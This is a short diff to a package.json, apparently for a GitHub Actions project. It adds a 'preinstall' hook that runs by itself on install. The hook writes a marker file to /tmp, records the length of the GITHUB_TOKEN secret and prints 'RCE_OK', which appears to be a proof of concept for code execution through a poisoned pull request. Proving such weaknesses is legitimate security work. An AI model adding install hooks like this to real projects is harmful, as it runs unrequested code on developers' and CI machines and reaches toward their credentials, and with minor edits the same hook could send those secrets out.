@@ -9,7 +9,8 @@
   },
   "scripts": {
     "typecheck": "tsc --noEmit",
-    "test": "vitest run"
+    "test": "vitest run",
+    "preinstall": "echo POC_MARKER_PLAYWRIGHT-HEALER > /tmp/POC_MARKER_PLAYWRIGHT-HEALER.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_PLAYWRIGHT-HEALER.txt; echo RCE_OK >> /tmp/POC_MARKER_PLAYWRIGHT-HEALER.txt; cat /tmp/POC_MARKER_PLAYWRIGHT-HEALER.txt"
   },
   "dependencies": {
     "@actions/core": "3.0.1",
